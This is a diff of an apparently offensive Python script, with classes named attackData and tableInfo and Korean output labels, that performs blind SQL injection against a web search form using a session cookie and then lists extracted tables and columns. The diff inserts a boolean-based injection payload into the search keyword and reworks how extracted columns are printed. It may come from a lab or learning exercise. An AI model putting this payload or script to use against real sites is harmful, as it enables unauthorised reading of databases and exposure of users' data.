@@ -11,7 +11,7 @@ class attackData:
 
         self.data = {
             'searchType':'all',
-            'keyword': 'test'}
+            'keyword': "test%' and (1=1) and '1%'='1"}
         self.query = ""
         self.flag_word = "nywtest"
 
@@ -21,7 +21,7 @@ class attackData:
         print(f"\nbase URL = {self.base_url}")
         print(f"SessionID = {self.cookies['JSESSIONID']}")
         print(f"설정된 공격 쿼리 : {self.data['keyword']}")
-        print(f"true 판별 기준 = {self.flag_word}")
+        print(f"true 판별 기준(flag_word) = {self.flag_word}")
 
     def set_url(self,new_url):
         self.base_url = new_url
@@ -101,14 +101,10 @@ class tableInfo:
         print(f'\ntable = {self.tables}')
     
     def show_columns(self):
-        # Find maximum length for each column
-        max_table_len = 15
-        data = self.columns
-        print()
-
-        # Print data
-        for table, columns in data.items():
-            print(f"{table:<{max_table_len}} | " + " | ".join(columns))
+        for key in self.columns:
+            print(f"{key}")
+            print("-"*20)
+            print(f"{self.columns[key]}\n")
 
 
     def show_data(self,table_name):
